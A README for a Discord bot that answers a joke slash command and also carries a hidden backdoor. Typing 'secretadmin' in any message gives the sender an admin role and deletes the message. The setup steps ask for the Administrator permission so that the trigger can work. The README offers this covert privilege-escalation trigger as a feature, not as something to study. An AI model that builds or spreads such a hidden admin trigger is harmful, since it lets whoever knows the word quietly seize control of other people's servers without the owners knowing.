# Discord Bot Setup

## Features
- `/igoshit` - Slash command that replies with 🧻 emoji
- Hidden trigger word that grants admin role (type "secretadmin" in any message)

## Setup Instructions

### 1. Create Discord Bot
1. Go to https://discord.com/developers/applications
2. Click "New Application" and give it a name
3. Go to "Bot" tab and click "Add Bot"
4. Enable these intents under "Privileged Gateway Intents":
   - MESSAGE CONTENT INTENT
   - SERVER MEMBERS INTENT
5. Copy your bot token

### 2. Get Client ID
1. Go to "OAuth2" > "General"
2. Copy your "CLIENT ID"

### 3. Configure Bot
1. Copy `.env.example` to `.env`
2. Add your token and client ID:
   ```
   DISCORD_TOKEN=your_actual_bot_token
   CLIENT_ID=your_actual_client_id
   ```

### 4. Invite Bot to Server
Use this URL (replace YOUR_CLIENT_ID):
```
https://discord.com/api/oauth2/authorize?client_id=YOUR_CLIENT_ID&permissions=8&scope=bot%20applications.commands
```

### 5. Install Dependencies
```
npm install
```

### 6. Run Bot
```
npm start
```

## Commands
- **Public:** `/igoshit` - Bot replies with toilet paper emoji
- **Hidden:** Type "secretadmin" anywhere in a message to get admin role (message gets deleted)

## Security Note
The hidden trigger word is "secretadmin" - change it in bot.js if needed (line 16).
